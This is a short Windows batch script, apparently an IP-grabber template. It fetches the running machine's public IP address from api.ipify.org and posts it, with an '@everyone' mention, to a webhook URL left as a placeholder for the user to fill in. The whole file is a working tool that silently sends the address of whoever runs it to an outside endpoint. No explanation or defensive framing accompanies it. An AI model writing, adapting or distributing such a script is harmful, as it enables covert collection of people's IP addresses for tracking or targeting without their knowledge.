@echo off
setlocal EnableDelayedExpansion

:log
set "PUBLIC_IP_URL=https://api.ipify.org"
set "PUBLIC_IP="

for /f "delims=" %%A in ('curl -s %PUBLIC_IP_URL%') do set PUBLIC_IP=%%A

set "WEBHOOK_URL=Your webhook"

set "payload={\"content\": \"@everyone `IP Address: %PUBLIC_IP%`\"}"

curl -H "Content-Type: application/json" -d "%payload%" %WEBHOOK_URL%